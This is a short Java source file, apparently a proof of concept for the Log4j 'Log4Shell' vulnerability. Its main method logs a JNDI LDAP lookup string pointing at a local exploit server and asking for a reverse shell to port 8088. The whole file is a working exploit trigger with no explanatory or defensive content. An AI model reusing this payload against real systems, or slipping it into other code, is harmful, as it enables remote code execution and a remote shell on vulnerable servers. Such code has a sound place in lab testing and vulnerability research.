import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;


public class log4j2 {
    public static final Logger logger = LogManager.getLogger(log4j2.class);

    public static void main(String[] args) {
        logger.error("${jndi:ldap://127.0.0.1:1389/Basic/ReverseShell/127.0.0.1/8088}");
    }
}
